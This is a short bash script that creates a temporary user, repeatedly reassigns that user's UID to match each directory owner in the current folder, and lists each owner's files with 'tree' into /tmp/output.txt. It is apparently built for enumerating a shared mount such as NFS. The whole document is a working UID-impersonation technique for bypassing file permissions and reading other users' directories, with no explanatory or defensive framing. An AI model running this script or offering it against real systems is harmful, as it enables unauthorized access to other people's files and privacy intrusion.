#!/bin/bash
echo "" > /tmp/output.txt
username=temper12
useradd -M -o -u 9999 ${username}
sleep 1
for targetuser in `ls -n | awk '{print $9}'` ; do
	if [[ ${targetuser} == 'lost+found' ]] ; then continue ; fi
	echo -n "[+] Now enumerating user ${targetuser}"
	targetuseruid=`ls -n | grep ${targetuser} | awk '{print $3}'`
	if [[ ${targetuseruid} == '0' ]] ; then continue ; fi
	usermod -o -u ${targetuseruid} ${username}
	cat /etc/passwd | grep "${username}"
	echo "------------------ ${targetuser} ------------------------------"  >> /tmp/output.txt
	su ${username} -c "tree -a ${targetuser}" >> /tmp/output.txt
	echo "---------------------------------------------------------------"  >> /tmp/output.txt
	sleep 1
done
userdel ${username}
